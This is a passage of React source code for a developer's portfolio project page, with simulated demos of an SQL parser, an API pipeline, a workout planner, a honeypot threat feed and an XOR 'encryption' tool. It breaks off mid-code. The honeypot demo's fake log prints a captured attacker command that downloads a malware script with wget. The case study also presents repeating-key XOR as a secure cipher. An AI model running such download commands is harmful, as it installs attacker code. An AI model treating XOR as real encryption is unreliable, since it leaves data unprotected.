import React, { useEffect, useState } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ArrowLeft, Shield, Terminal, Cpu, Activity, Server,
  Database, GitBranch, Play, ExternalLink, AlertTriangle,
  CheckCircle, Globe, ShieldAlert, Zap, Layers,
  Pause, RotateCcw, ChevronLeft, ChevronRight, Check, X,
  Radar
} from 'lucide-react';
import { portfolioData } from '../data/portfolioData';
import { SIMULATION_DATA } from '../data/simulationEngine';
import Card from '../components/ui/Card';
import Button from '../components/ui/Button';

export const ProjectDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  // Route adapter to resolve front-facing IDs to data database IDs
  const idMap = {
    'sqlsense': 'sqlsense',
    'honeypot-system': 'honeypot-system',
    'file-encryption-tool': 'file-encryption-tool',
    'heuristic-workout-app': 'workout-planning-app',
    'workout-planning-app': 'workout-planning-app',
    'dynamic-api-generator': 'api-automation-generator',
    'api-automation-generator': 'api-automation-generator'
  };

  const resolvedId = idMap[id] || id;
  const project = portfolioData.projects.find((p) => p.id === resolvedId);

  // States for the fully interactive AI Threat Feed Simulator (Honeypot Case Study)
  const [threatLogs, setThreatLogs] = useState([
    { id: 1, ip: '185.220.101.4', country: 'RU', port: 22, type: 'Brute Force SSH', severity: 'CRITICAL', time: 'JUST NOW' },
    { id: 2, ip: '45.227.254.12', country: 'NL', port: 80, type: 'SQL Injection', severity: 'HIGH', time: '2s ago' },
    { id: 3, ip: '194.26.29.112', country: 'CN', port: 8080, type: 'Port Mapping Sweep', severity: 'MEDIUM', time: '5s ago' }
  ]);
  const [attackCounter, setAttackCounter] = useState(14282);

  // Unified Simulation Player States
  const [activeStep, setActiveStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);

  // HeuristicAI (Workout) States
  const [workoutGoal, setWorkoutGoal] = useState("hypertrophy");
  const [workoutLevel, setWorkoutLevel] = useState("intermediate");
  const [workoutFatigue, setWorkoutFatigue] = useState("normal");

  // Honeypot System States
  const [attackScenario, setAttackScenario] = useState("ssh");

  // File Encryption & Decryption States
  const [encryptInput, setEncryptInput] = useState("Secure-Crypto-Engine");
  const [encryptKey, setEncryptKey] = useState("SECURE_CPP_KEY_128");
  const [cryptoMode, setCryptoMode] = useState("encrypt");
  const [bufferWindow, setBufferWindow] = useState("16KB");
  const [decryptPassphrase, setDecryptPassphrase] = useState("SECURE_CPP_KEY_128");

  // SQLSense States
  const [sqlQuery, setSqlQuery] = useState(`SELECT u.name, COUNT(o.id)
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE u.status = 'active'
GROUP BY u.name
ORDER BY COUNT(o.id) DESC
LIMIT 10;`);

  // Auto-play timer for current project simulation
  useEffect(() => {
    let timer;
    if (isPlaying) {
      const stepsCount = SIMULATION_DATA[resolvedId]?.steps?.length || 1;
      timer = setInterval(() => {
        setActiveStep((prev) => (prev < stepsCount - 1 ? prev + 1 : 0));
      }, 2500);
    }
    return () => clearInterval(timer);
  }, [isPlaying, resolvedId]);

  // Reset steps on project change
  useEffect(() => {
    setActiveStep(0);
    setIsPlaying(false);
  }, [resolvedId]);

  // Simulated live log generator
  useEffect(() => {
    if (resolvedId !== 'honeypot-system') return;

    const ips = ['83.149.9.216', '110.50.243.12', '198.51.100.42', '45.143.203.4', '185.222.211.5'];
    const countries = ['UA', 'US', 'DE', 'SG', 'BR'];
    const ports = [22, 80, 443, 8080, 3306];
    const attacks = ['DDoS Syn Flood', 'Cross-Site Scripting (XSS)', 'Ransomware Payload Attempt', 'Buffer Overflow Spec', 'MySQL Injection Try'];
    const severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];

    const interval = setInterval(() => {
      const newLog = {
        id: Date.now(),
        ip: ips[Math.floor(Math.random() * ips.length)],
        country: countries[Math.floor(Math.random() * countries.length)],
        port: ports[Math.floor(Math.random() * ports.length)],
        type: attacks[Math.floor(Math.random() * attacks.length)],
        severity: severities[Math.floor(Math.random() * severities.length)],
        time: 'JUST NOW'
      };

      setThreatLogs(prev => {
        const updated = [newLog, ...prev.map(log => ({
          ...log,
          time: log.time === 'JUST NOW' ? '3s ago' : log.time === '2s ago' ? '5s ago' : '10s ago'
        }))];
        return updated.slice(0, 5); // Constrain list height
      });

      setAttackCounter(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 4000);

    return () => clearInterval(interval);
  }, [resolvedId]);

  // Scroll to top on route change
  useEffect(() => {
    window.scrollTo(0, 0);
  }, [id]);

  if (!project) {
    return (
      <div className="min-h-[70vh] flex flex-col justify-center items-center text-center space-y-4 pt-24 font-mono">
        <h2 className="text-2xl font-bold text-slate-900 dark:text-slate-100">404: SECURE ENCLAVE RESTRICTED</h2>
        <p className="text-sm text-slate-500 dark:text-slate-400 max-w-sm">The project parameter you requested does not exist or has been restricted.</p>
        <Button variant="outline" onClick={() => navigate('/')}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          RETURN TO DASHBOARD
        </Button>
      </div>
    );
  }

  // Case Study comprehensive structured DB
  const caseStudies = {
    'sqlsense': {
      problem: "Database learners, developers, and data analysts frequently struggle to dissect and debug complex SQL queries containing nested joins, aggregations, subqueries, and window functions. Standard parser systems usually output highly abstract syntax trees or database execution plans that are hard for humans to understand, lacking clear clause-by-clause logic explanations.",
      architecture: "Built on a full-stack Next.js 15 App Router codebase with React 19. It uses a structured Abstract Syntax Tree (AST) parser engine to parse SQL queries sequentially into segmented components. Data persistence and authentication are powered by Supabase with Row-Level Security (RLS) policies protecting query history logs, while Zod acts as the validation boundary for inputs.",
      decisions: "Adopted Next.js 15 to facilitate rapid server/client rendering and simplify API routing. Implemented type-safety using TypeScript across the entire syntax parser to avoid structural runtime errors, and utilized Vitest to create a comprehensive test suite for checking query clause breakdown logic.",
      challenges: "Safely processing highly nested SELECT queries and various JOIN variations without triggering execution loops or parsing overheads. This was solved by engineering a recursive descent parser design with bounded depth limits, converting raw query text into clean visual segments and complexity classifications."
    },
    'honeypot-system': {
      problem: "Traditional corporate defense architectures suffer from high opacity. Standard firewall configurations dropping network packets offer zero feedback on adversary motivations, lateral escalation strategies, or raw payload signatures. Security centers are forced into completely reactive, blind states.",
      architecture: "A distributed enterprise deception and telemetry architecture spanning three dedicated live platforms: (1) Nowhere Esports Portal — an exposed public-facing decoy application acting as reconnaissance bait; (2) Admin Nowhere Console — an authentic simulated administrative control deck instrumented to intercept credential stuffing, SQL injections, and brute-force attempts; and (3) Vigilance SOC Radar — a centralized Security Operations Center dashboard ingesting high-throughput Kafka queues and FastAPI streams to visualize attack origins and classify threat actors in real time.",
      decisions: "Selecting Apache Kafka was a critical operational decision to buffer extreme burst loads occurring during synchronized distributed brute-force sweeps. Choosing FastAPI's asynchronous IO loops eliminated threading latency, allowing standard servers to coordinate multi-source packet captures efficiently. The user-facing interfaces were cleanly separated into three independent live deployments: the public decoy portal (Nowhere), the simulated admin console (Admin Nowhere), and the central SOC telemetry dashboard (Vigilance SOC Radar).",
      challenges: "Massive volumetric scan traffic triggered connection thread exhaustions at the aggregation interface. This challenge was resolved by introducing an in-memory sliding window Token Bucket rate-limiter combined with persistent multi-stage logging caches to isolate telemetry processing loops from main ingestion threads."
    },
    'file-encryption-tool': {
      problem: "Standard GUI desktop encryption tools frequently load entire large binary files directly into RAM, causing heap memory exhaustions, buffer overflows, and application thread freezes when processing gigabyte-scale datasets.",
      architecture: "A high-performance C++ stream cipher engine built with modern C++17. Utilizes RAII-managed memory buffers (std::vector<uint8_t>) and chunked file streaming (std::ifstream/std::ofstream in 16KB windows) to process files of arbitrary size with constant minimal memory overhead. Features symmetric key matrix derivation and SHA-256 binary hash validation.",
      decisions: "Modern C++ (C++17) was selected to enforce compile-time optimization, strict type safety, zero-overhead abstractions, and direct hardware register utilization. Implemented bitwise XOR key expansion matrices for fast symmetrical streaming and modular cipher extensibility.",
      challenges: "Ensuring data integrity during streaming and preventing buffer underflows or corrupted decryption outputs. Solved by engineering pre-flight file header integrity markers and SHA-256 checksum headers that validate stream block alignment before payload processing."
    },
    'workout-planning-app': {
      problem: "Standard wellness apps construct fixed schedule plans. If users hit inevitable schedule conflicts, the software fails to adapt, inducing user frustration and leading directly to routine abandonment.",
      architecture: "A decoupled Python utility operating as a localized service. The system parses local JSON databases containing physical threshold levels and calendars. When a workout is skipped, a heuristic adapter recalculates targets, using a rule-based system to reschedule activities.",
      decisions: "Designed utilizing Python to leverage lightweight built-in libraries. Opted for local JSON files rather than external cloud database engines to guarantee absolute user privacy and ensure instant offline responsiveness.",
      challenges: "Triggering OS-level background desktop toast alerts blocked the main scheduling thread, causing lags in CLI interactions. Solved by decoupling system warning alerts into dedicated background workers utilizing Python's `threading` modules."
    },
    'api-automation-generator': {
      problem: "Scaffolding backend endpoints, Express models, routes, database connections, and validation checks takes developers hours of repetitive, manual boilerplate drafting, which is highly prone to human script syntax errors.",
      architecture: "A modern metadata transpilation engine. A visual React interface allows rapid definition of JSON model schemas. The client-side utility maps these inputs against standard Express/ESM template structures, compiling fully configured zip archives ready for server injection.",
      decisions: "React + Tailwind CSS was used to provide a high-fidelity visual interface for model editing. Integrated client-side compilation structures using memory buffers to execute archive creations entirely without server runtime delays.",
      challenges: "Maintaining multi-directory structure integrity when compressing templates within browser environments. Resolved by constructing nested tree paths dynamically using in-memory virtual blobs before pushing outputs to high-speed file download vectors."
    }
  };

  const handlePrev = () => {
    setIsPlaying(false);
    const stepsCount = SIMULATION_DATA[resolvedId]?.steps?.length || 1;
    setActiveStep((prev) => (prev > 0 ? prev - 1 : stepsCount - 1));
  };

  const handleNext = () => {
    setIsPlaying(false);
    const stepsCount = SIMULATION_DATA[resolvedId]?.steps?.length || 1;
    setActiveStep((prev) => (prev < stepsCount - 1 ? prev + 1 : 0));
  };

  const handleReset = () => {
    setIsPlaying(false);
    setActiveStep(0);
  };

  const handleTogglePlay = () => {
    setIsPlaying(!isPlaying);
  };

  const renderSqlSenseSim = () => {
    const stepId = SIMULATION_DATA.sqlsense.steps[activeStep]?.id;
    return (
      <div className="space-y-4 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
        <span className="text-[9px] text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">SQL QUERY PARSER (VISUAL HIGHLIGHT):</span>
        <div className="p-4 rounded-2xl liquid-glass-well text-slate-600 dark:text-slate-300 font-mono text-[10px] leading-relaxed">
          <div>
            <span className={stepId === 'select' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>SELECT u.name, COUNT(o.id)</span>
          </div>
          <div>
            <span className={stepId === 'from' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>FROM users u</span>
          </div>
          <div>
            <span className={stepId === 'join' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>LEFT JOIN orders o ON u.id = o.user_id</span>
          </div>
          <div>
            <span className={stepId === 'where' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>WHERE u.status = 'active'</span>
          </div>
          <div>
            <span className={stepId === 'groupby' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>GROUP BY u.name</span>
          </div>
          <div className="opacity-50">
            <span className={stepId === 'having' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>-- HAVING (Skipped)</span>
          </div>
          <div>
            <span className={stepId === 'orderby' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>ORDER BY COUNT(o.id) DESC</span>
          </div>
          <div>
            <span className={stepId === 'limit' ? 'text-blue-700 dark:text-sky-300 bg-blue-500/12 font-bold px-1 rounded border border-blue-500/25' : ''}>LIMIT 10;</span>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-3 text-center">
          <div className="p-2.5 liquid-glass-well rounded-2xl">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 block uppercase">Complexity Rating</span>
            <span className="text-xs text-amber-600 dark:text-amber-400 font-bold">MEDIUM (JOIN &amp; GROUP)</span>
          </div>
          <div className="p-2.5 liquid-glass-well rounded-2xl">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 block uppercase">Optimization tip</span>
            <span className="text-[9px] text-blue-600 dark:text-sky-400 font-bold">Index foreign keys</span>
          </div>
        </div>
      </div>
    );
  };

  const renderApiGeneratorSim = () => {
    const stepId = SIMULATION_DATA['api-automation-generator'].steps[activeStep]?.id;
    const nodes = [
      { id: 'client-req', label: 'Client' },
      { id: 'auth', label: 'Auth' },
      { id: 'authz', label: 'Authz' },
      { id: 'validation', label: 'Valid' },
      { id: 'middleware', label: 'Mware' },
      { id: 'rate-limiter', label: 'Limit' },
      { id: 'controller', label: 'Route' },
      { id: 'database', label: 'Postgres' },
      { id: 'response', label: 'Resp' }
    ];

    return (
      <div className="space-y-4 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
        <span className="text-[9px] text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">API REQUEST FLOW PIPELINE:</span>
        <div className="flex flex-wrap items-center justify-between gap-1 p-3 liquid-glass-well rounded-2xl overflow-x-auto">
          {nodes.map((node, index) => {
            const isActive = stepId === node.id;
            const isCompleted = nodes.findIndex(n => n.id === stepId) > index;
            return (
              <React.Fragment key={node.id}>
                {index > 0 && <span className="text-slate-400 dark:text-slate-600 text-[8px]">&rarr;</span>}
                <div className={`px-2 py-1 rounded-full border text-[9px] font-bold transition-colors ${isActive
                    ? 'bg-blue-600 border-blue-500 text-white'
                    : isCompleted
                      ? 'border-emerald-500/30 text-emerald-600 dark:text-emerald-400 bg-emerald-500/10'
                      : 'border-slate-900/10 dark:border-white/10 text-slate-500 dark:text-slate-400'
                  }`}>
                  {node.label}
                </div>
              </React.Fragment>
            );
          })}
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-[10px] font-mono">
          <div className="p-3 liquid-glass-well rounded-2xl space-y-1">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 uppercase block font-bold">REQUEST STATE LOG:</span>
            {activeStep <= 1 && <pre className="text-slate-600 dark:text-slate-300">GET /api/v1/users</pre>}
            {activeStep === 2 && <pre className="text-blue-600 dark:text-sky-400 font-bold">Checking JWT bearer signature...</pre>}
            {activeStep === 3 && <pre className="text-blue-600 dark:text-sky-400 font-bold">User privilege: &quot;read:users&quot;</pre>}
            {activeStep === 4 && <pre className="text-slate-600 dark:text-slate-300">{`{\n  "tenantId": "org_99",\n  "limit": 10\n}`}</pre>}
            {activeStep === 5 && <pre className="text-slate-600 dark:text-slate-300">Context: trace_id_f7d8</pre>}
            {activeStep === 6 && <pre className="text-emerald-600 dark:text-emerald-400 font-bold">IP tokens: 99/100 (OK)</pre>}
            {activeStep === 7 && <pre className="text-slate-600 dark:text-slate-300">Calling UsersController.find()</pre>}
            {activeStep >= 8 && <pre className="text-slate-500 dark:text-slate-400">Query successfully executed</pre>}
          </div>

          <div className="p-3 liquid-glass-well rounded-2xl space-y-1">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 uppercase block font-bold">OPENAPI COMPILER:</span>
            <pre className="text-slate-600 dark:text-slate-300 text-[8px] leading-tight">
              {`/api/v1/users:\n  get:\n    summary: List Users\n    security:\n      - BearerAuth: []\n    responses:\n      200:\n        description: Success`}
            </pre>
          </div>
        </div>
      </div>
    );
  };

  const renderWorkoutSim = () => {
    let splitName = "3-Day Full Body Split";
    let baseSets = 12;
    let baseReps = "8-12 reps";
    if (workoutGoal === "strength") {
      splitName = "4-Day Upper/Lower Strength";
      baseSets = 16;
      baseReps = "3-5 reps";
    } else if (workoutGoal === "endurance") {
      splitName = "3-Day Push/Pull/Legs Endurance";
      baseSets = 10;
      baseReps = "15-20 reps";
    }
    if (workoutFatigue === "high") {
      baseSets = Math.round(baseSets * 0.8);
    }
    return (
      <div className="space-y-4 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
        <span className="text-[9px] text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">HEURISTIC SELECTORS:</span>
        <div className="grid grid-cols-3 gap-2">
          <div className="space-y-1">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">Training Goal:</span>
            <select
              value={workoutGoal}
              onChange={(e) => setWorkoutGoal(e.target.value)}
              className="w-full bg-white/80 dark:bg-slate-900/80 border border-slate-900/10 dark:border-white/15 rounded-xl p-1.5 text-[9px] font-bold text-slate-800 dark:text-slate-200 focus:outline-none"
            >
              <option value="hypertrophy">HYPERTROPHY</option>
              <option value="strength">STRENGTH</option>
              <option value="endurance">ENDURANCE</option>
            </select>
          </div>
          <div className="space-y-1">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">Tenure/Level:</span>
            <select
              value={workoutLevel}
              onChange={(e) => setWorkoutLevel(e.target.value)}
              className="w-full bg-white/80 dark:bg-slate-900/80 border border-slate-900/10 dark:border-white/15 rounded-xl p-1.5 text-[9px] font-bold text-slate-800 dark:text-slate-200 focus:outline-none"
            >
              <option value="beginner">BEGINNER</option>
              <option value="intermediate">INTERMEDIATE</option>
              <option value="advanced">ADVANCED</option>
            </select>
          </div>
          <div className="space-y-1">
            <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">Fatigue:</span>
            <select
              value={workoutFatigue}
              onChange={(e) => setWorkoutFatigue(e.target.value)}
              className="w-full bg-white/80 dark:bg-slate-900/80 border border-slate-900/10 dark:border-white/15 rounded-xl p-1.5 text-[9px] font-bold text-slate-800 dark:text-slate-200 focus:outline-none"
            >
              <option value="normal">RESTED / NORMAL</option>
              <option value="high">HIGH FATIGUE</option>
            </select>
          </div>
        </div>

        <div className="p-4 liquid-glass-well rounded-2xl space-y-2">
          <div className="flex justify-between items-center text-[10px]">
            <span className="text-slate-500 dark:text-slate-400 uppercase font-bold">Heuristic Routine Split:</span>
            <span className="text-blue-600 dark:text-sky-400 font-bold">{splitName}</span>
          </div>
          <div className="grid grid-cols-2 gap-3 text-[10px] pt-2 border-t border-slate-900/[0.08] dark:border-white/[0.08] font-mono">
            <div>
              <span className="text-slate-500 dark:text-slate-400 uppercase block font-bold text-[8px]">Target sets / week:</span>
              <span className="text-slate-800 dark:text-slate-200 font-bold">{baseSets} working sets</span>
            </div>
            <div>
              <span className="text-slate-500 dark:text-slate-400 uppercase block font-bold text-[8px]">Rep intensity split:</span>
              <span className="text-slate-800 dark:text-slate-200 font-bold">{baseReps}</span>
            </div>
          </div>
        </div>

        <div className="p-2.5 liquid-glass-well rounded-2xl flex justify-between items-center text-[9px] font-mono">
          <span className="text-slate-500 dark:text-slate-400 uppercase tracking-wider font-bold">PROGRESS FORECASTER:</span>
          <span className="text-emerald-600 dark:text-emerald-400 font-bold">Estimated capability: {workoutGoal === 'strength' ? '+15% 1RM strength gain' : '+4.5 lbs mass forecast'}</span>
        </div>
      </div>
    );
  };

  const renderHoneypotSim = () => {
    const stepId = SIMULATION_DATA['honeypot-system'].steps[activeStep]?.id;
    const severityMap = {
      ssh: { val: 65, label: 'HIGH', color: 'text-amber-600 dark:text-amber-400' },
      sql: { val: 95, label: 'CRITICAL', color: 'text-red-600 dark:text-red-400' },
      shell: { val: 80, label: 'HIGH', color: 'text-amber-600 dark:text-amber-400' }
    };
    const activeSeverity = severityMap[attackScenario] || severityMap.ssh;
    return (
      <div className="space-y-4 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
        <span className="text-[9px] text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">REPLAY ATTACK VECTOR:</span>
        <div className="grid grid-cols-3 gap-2">
          {['ssh', 'sql', 'shell'].map(sc => (
            <button
              key={sc}
              onClick={() => setAttackScenario(sc)}
              className={`py-1.5 rounded-full border font-bold text-[9px] uppercase tracking-wider transition-colors cursor-pointer ${attackScenario === sc
                  ? 'liquid-btn-primary'
                  : 'liquid-glass-well text-slate-700 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white'
                }`}
            >
              {sc === 'ssh' && 'SSH Brute'}
              {sc === 'sql' && 'SQL Inject'}
              {sc === 'shell' && 'Malware script'}
            </button>
          ))}
        </div>

        <div className="p-3 liquid-glass-well rounded-2xl space-y-1.5 font-mono">
          <div className="flex justify-between items-center text-[10px]">
            <span className="text-slate-500 dark:text-slate-400 font-bold uppercase block">HEURISTIC RISK SCORE:</span>
            <span className={`font-black ${activeSeverity.color}`}>{activeSeverity.label} ({activeSeverity.val}/100)</span>
          </div>
          <div className="w-full bg-slate-900/10 dark:bg-slate-950 h-2 border border-slate-900/10 dark:border-white/10 rounded-full overflow-hidden">
            <div
              className={`h-full transition-all duration-500 ${activeSeverity.label === 'CRITICAL' ? 'bg-red-500' : 'bg-amber-500'
                }`}
              style={{ width: `${activeSeverity.val}%` }}
            />
          </div>
        </div>

        <div className="p-3.5 liquid-glass-well rounded-2xl font-mono text-[9px] leading-relaxed max-h-36 overflow-y-auto">
          <span className="text-[8px] text-slate-500 dark:text-slate-400 block uppercase font-bold mb-1">// DECOUPLED DECOY LOG CHANNEL:</span>
          {activeStep >= 0 && <p className="text-blue-600 dark:text-sky-400 font-bold">[185.220.101.4 (RU)] handshake SYN received on port 22</p>}
          {activeStep >= 1 && <p className="text-slate-600 dark:text-slate-300">[Decoy SSHd] Login prompts generated. Threat actor entered password attempt: &quot;admin123&quot;</p>}
          {activeStep >= 2 && <p className="text-amber-600 dark:text-amber-400 font-bold">[ATTEMPT] Commencing user login access, executing shell script...</p>}
          {activeStep >= 3 && <p className="text-slate-600 dark:text-slate-300">[DUMP] session command captured: &quot;wget http://185.220.101.4/malware.sh&quot;</p>}
          {activeStep >= 4 && <p className="text-blue-600 dark:text-sky-400 font-bold">[THREAT ENGINE] Score calculated: {activeSeverity.val}/100 ({activeSeverity.label})</p>}
          {activeStep >= 5 && <p className="text-emerald-600 dark:text-emerald-400 font-bold">[DISPATCH] Dispatching alert to Slack Channel #threat-feed-vigilance</p>}
        </div>

        {stepId === 'alert' && (
          <div className="border border-red-500/40 bg-red-500/10 p-3 rounded-2xl flex items-center space-x-2.5">
            <ShieldAlert className="w-4 h-4 text-red-600 dark:text-red-400 flex-shrink-0" />
            <div className="text-[9px] font-mono text-red-700 dark:text-red-300">
              <span className="font-extrabold uppercase block text-red-600 dark:text-red-400">DISCORD THREAT ALERT DISPATCHED:</span>
              <span>185.220.101.4: High-Interaction attack intercepted! Command log: wget http://...</span>
            </div>
          </div>
        )}

        <div className="p-2.5 liquid-glass-well rounded-2xl flex flex-wrap gap-2 items-center justify-between font-mono text-[9px]">
          <span className="text-slate-500 dark:text-slate-400 uppercase font-bold text-[8px]">Live Deployments:</span>
          <div className="flex flex-wrap gap-1.5">
            <a href="https://owhere-esports-portal.vercel.app/" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-full liquid-glass-well text-slate-700 dark:text-slate-200 hover:text-blue-600 dark:hover:text-white transition-colors flex items-center gap-1">
              <span>Nowhere Decoy</span>
              <ExternalLink className="w-2.5 h-2.5" />
            </a>
            <a href="https://honeypot-system-rho.vercel.app/" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-full liquid-glass-well text-slate-700 dark:text-slate-200 hover:text-blue-600 dark:hover:text-white transition-colors flex items-center gap-1">
              <span>Admin Nowhere</span>
              <ExternalLink className="w-2.5 h-2.5" />
            </a>
            <a href="https://vigilance-soc-radar.vercel.app/" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-full bg-blue-500/12 border border-blue-500/25 text-blue-700 dark:text-sky-300 transition-colors flex items-center gap-1 font-bold">
              <span>SOC Radar</span>
              <ExternalLink className="w-2.5 h-2.5" />
            </a>
          </div>
        </div>
      </div>
    );
  };

  const renderEncryptionSim = () => {
    const xorTransform = (text, key) => {
      if (!text || !key) return "";
      let result = "";
      for (let i = 0; i < text.length; i++) {
        const charCode = text.charCodeAt(i);
        const keyVal = key.charCodeAt(i % key.length);
        result += String.fromCharCode(charCode ^ keyVal);
      }
      return result;
    };

    const toHexStr = (text) => {
      if (!text) return "00";
      let hex = "";
      for (let i = 0; i < text.length; i++) {
        hex += text.charCodeAt(i).toString(16).toUpperCase().padStart(2, "0") + " ";
      }
      return hex.trim();
    };

    const cipherText = xorTransform(encryptInput, encryptKey);
    const plainHex = toHexStr(encryptInput);
    const cipherHex = toHexStr(cipherText);
    const keyHex = toHexStr(encryptKey);

    const isCorrectKey = decryptPassphrase === encryptKey;
    const restoredText = isCorrectKey
      ? xorTransform(cipherText, decryptPassphrase)
      : xorTransform(cipherText, decryptPassphrase || "INVALID_KEY");
    const restoredHex = toHexStr(restoredText);

    const applyPreset = (text) => {
      setEncryptInput(text);
    };

    return (
      <div className="space-y-4 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08] font-mono">

        {/* Mode Selector & Buffer Window Controls */}
        <div className="space-y-2">
          <div className="flex justify-between items-center text-[9px]">
            <span className="text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">
              C++ ENGINE MODE &amp; CONTROLS:
            </span>
            <span className="font-mono text-blue-700 dark:text-sky-300 bg-blue-500/12 px-2 py-0.5 rounded-full font-bold">
              C++17 STREAM PIPELINE
            </span>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={() => {
                setCryptoMode("encrypt");
                setActiveStep(2);
              }}
              className={`py-2 px-3 rounded-full border font-bold text-[9px] uppercase tracking-wider transition-colors cursor-pointer flex items-center justify-center space-x-1.5 ${cryptoMode === "encrypt"
                  ? "liquid-btn-primary"
                  : "liquid-glass-well text-slate-700 dark:text-slate-300"
                }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span>ENCRYPT (ENCODE)</span>
            </button>
            <button
              onClick={() => {
                setCryptoMode("decrypt");
                setActiveStep(4);
              }}
              className={`py-2 px-3 rounded-full border font-bold text-[9px] uppercase tracking-wider transition-colors cursor-pointer flex items-center justify-center space-x-1.5 ${cryptoMode === "decrypt"
                  ? "bg-emerald-600 text-white border-emerald-500"
                  : "liquid-glass-well text-slate-700 dark:text-slate-300"
                }`}
            >
              <CheckCircle className="w-3.5 h-3.5" />
              <span>DECRYPT (RECOVER)</span>
            </button>
          </div>
        </div>

        {/* Inputs & Parameters */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          {cryptoMode === "encrypt" ? (
            <div className="space-y-1">
              <div className="flex justify-between items-center">
                <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">Input Data Stream:</span>
                <div className="flex space-x-1">
                  <button
                    onClick={() => applyPreset("CONFIDENTIAL_PAYLOAD_V2_CPP")}
                    className="text-[8px] text-blue-600 dark:text-sky-400 hover:underline font-mono"
                  >
                    [Preset 1]
                  </button>
                  <button
                    onClick={() => applyPreset("KERNEL_VAULT_0x7FFF_KEY")}
                    className="text-[8px] text-blue-600 dark:text-sky-400 hover:underline font-mono"
                  >
                    [Preset 2]
                  </button>
                </div>
              </div>
              <input
                type="text"
                value={encryptInput}
                onChange={(e) => setEncryptInput(e.target.value)}
                placeholder="Enter plaintext..."
                className="w-full bg-white/80 dark:bg-slate-900/70 border border-slate-900/10 dark:border-white/15 rounded-xl p-2 text-[10px] font-mono font-bold text-slate-900 dark:text-slate-100 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
            </div>
          ) : (
            <div className="space-y-1">
              <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">Ciphertext Buffer to Decrypt (Hex):</span>
              <input
                type="text"
                readOnly
                value={cipherHex || "00"}
                className="w-full bg-white/80 dark:bg-slate-900/70 border border-slate-900/10 dark:border-white/15 rounded-xl p-2 text-[9px] font-mono font-bold text-amber-600 dark:text-amber-400 select-all cursor-pointer focus:outline-none"
                title="Active Ciphertext Stream generated from Encryption phase"
              />
            </div>
          )}

          <div className="space-y-1">
            <div className="flex justify-between items-center">
              <span className="text-[8px] text-slate-500 dark:text-slate-400 block font-bold uppercase">
                {cryptoMode === "encrypt" ? "Secret Passphrase Key:" : "Decryption Secret Key:"}
              </span>
              <span className="text-[8px] text-slate-500 dark:text-slate-400 font-mono">
                {(cryptoMode === "encrypt" ? encryptKey : decryptPassphrase).length} B
              </span>
            </div>
            {cryptoMode === "encrypt" ? (
              <input
                type="text"
                value={encryptKey}
                onChange={(e) => {
                  setEncryptKey(e.target.value);
                  setDecryptPassphrase(e.target.value);
                }}
                className="w-full bg-white/80 dark:bg-slate-900/70 border border-slate-900/10 dark:border-white/15 rounded-xl p-2 text-[10px] font-mono font-bold text-slate-900 dark:text-slate-100 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
            ) : (
              <input
                type="text"
                value={decryptPassphrase}
                onChange={(e) => setDecryptPassphrase(e.target.value)}
                className={`w-full bg-white/80 dark:bg-slate-900/70 border rounded-xl p-2 text-[10px] font-mono font-bold focus:outline-none ${isCorrectKey ? "text-emerald-600 dark:text-emerald-400 border-emerald-500/50" : "text-red-600 dark:text-red-400 border-red-500/50"
                  }`}
              />
            )}
          </div>
        </div>

        {/* C++ Stream Window Buffer Size Selector */}
        <div className="flex justify-between items-center p-2.5 liquid-glass-well rounded-2xl text-[9px]">
          <span className="text-slate-500 dark:text-slate-400 font-bold uppercase text-[8px]">C++ RAII Memory Window Buffer:</span>
          <div className="flex space-x-1.5">
            {["4KB", "16KB", "64KB"].map((size) => (
              <button
                key={size}
                onClick={() => setBufferWindow(size)}
                className={`px-2.5 py-0.5 rounded-full text-[8px] font-bold transition-colors cursor-pointer ${bufferWindow === size
